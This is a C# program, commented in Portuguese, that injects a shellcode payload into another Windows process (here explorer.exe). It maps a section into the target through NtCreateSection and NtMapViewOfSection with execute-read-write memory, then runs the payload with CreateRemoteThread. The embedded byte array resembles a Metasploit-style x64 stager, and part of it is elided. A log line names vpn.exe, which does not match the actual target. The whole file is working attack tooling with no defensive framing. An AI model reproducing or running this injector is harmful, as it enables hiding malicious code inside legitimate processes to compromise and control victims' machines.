using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class NtApiInjection
{
    // Constants
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint MEM_COMMIT = 0x00001000;
    private const uint MEM_RESERVE = 0x00002000;
    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    private const uint SECTION_MAP_READ = 0x0004;
    private const uint SECTION_MAP_WRITE = 0x0002;
    private const uint SECTION_MAP_EXECUTE = 0x0008;
    private const uint SECTION_ALL_ACCESS = 0x000F001F;
    private const uint VIEW_READ = 1;
    private const uint VIEW_WRITE = 2;
    private const uint VIEW_EXECUTE = 4;

    // NT API Definitions
    [DllImport("ntdll.dll")]
    private static extern int NtCreateSection(
        ref IntPtr sectionHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        ref long maximumSize,
        uint sectionPageProtection,
        uint allocationAttributes,
        IntPtr fileHandle);

    [DllImport("ntdll.dll")]
    private static extern int NtMapViewOfSection(
        IntPtr sectionHandle,
        IntPtr processHandle,
        ref IntPtr baseAddress,
        IntPtr zeroBits,
        IntPtr commitSize,
        IntPtr sectionOffset,
        ref long viewSize,
        uint inheritDisposition,
        uint allocationType,
        uint win32Protect);

    [DllImport("ntdll.dll")]
    private static extern int NtUnmapViewOfSection(
        IntPtr processHandle,
        IntPtr baseAddress);

    [DllImport("ntdll.dll")]
    private static extern int NtClose(IntPtr handle);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static bool Inject(byte[] shellcode, string processName)
    {
        IntPtr hSection = IntPtr.Zero, localAddr = IntPtr.Zero, remoteAddr = IntPtr.Zero;
        IntPtr hProcess = IntPtr.Zero, hThread = IntPtr.Zero;

        try
        {
            // 1. Pegar o processo alvo
            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0)
            {
                Console.WriteLine("[-] Processo alvo não encontrado");
                return false;
            }

            // 2. Abrir o processo com direitos necessários
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processes[0].Id);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Falha ao abrir o processo");
                return false;
            }

            // 3. Criar seção de memória
            long size = shellcode.Length;
            int status = NtCreateSection(ref hSection, SECTION_ALL_ACCESS, IntPtr.Zero,
                ref size, PAGE_EXECUTE_READWRITE, 0x08000000, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine($"[-] NtCreateSection falhou (0x{status:X8})");
                return false;
            }

            // 4. Mapear localmente e escrever shellcode
            long viewSize = 0;
            status = NtMapViewOfSection(hSection, Process.GetCurrentProcess().Handle,
                ref localAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                ref viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine($"[-] Primeiro NtMapViewOfSection falhou (0x{status:X8})");
                return false;
            }

            Marshal.Copy(shellcode, 0, localAddr, shellcode.Length);

            // 5. Mapear no processo alvo (COM PROTEÇÃO CORRETA)
            status = NtMapViewOfSection(hSection, hProcess, ref remoteAddr,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize,
                2, 0, PAGE_EXECUTE_READWRITE); // Mantido como READWRITE para evitar crash
            if (status != 0)
            {
                Console.WriteLine($"[-] Segundo NtMapViewOfSection falhou (0x{status:X8})");
                return false;
            }

            // 6. Criar thread e ESPERAR ela terminar
            hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
                remoteAddr, IntPtr.Zero, 0x00000004, out _); // CREATE_SUSPENDED
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] CreateRemoteThread falhou");
                return false;
            }

            // 7. Retomar thread e esperar execução
            ResumeThread(hThread);
            WaitForSingleObject(hThread, 0xFFFFFFFF); // Espera indefinidamente

            Console.WriteLine("[+] Injeção bem-sucedida!");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Erro: {ex.Message}");
            return false;
        }
        finally
        {
            // Limpeza segura
            if (hThread != IntPtr.Zero) NtClose(hThread);
            if (localAddr != IntPtr.Zero) NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localAddr);
            if (remoteAddr != IntPtr.Zero) NtUnmapViewOfSection(hProcess, remoteAddr);
            if (hSection != IntPtr.Zero) NtClose(hSection);
            if (hProcess != IntPtr.Zero) NtClose(hProcess);
        }
    }

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(IntPtr hThread);

    public static void Main()
    {
        byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
..
0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};

        Console.WriteLine("[*] Tentando injeção em vpn.exe...");
        if (!Inject(buf, "explorer"))
        {
            Console.WriteLine("[-] Falha na injeção");
        }
    }
}
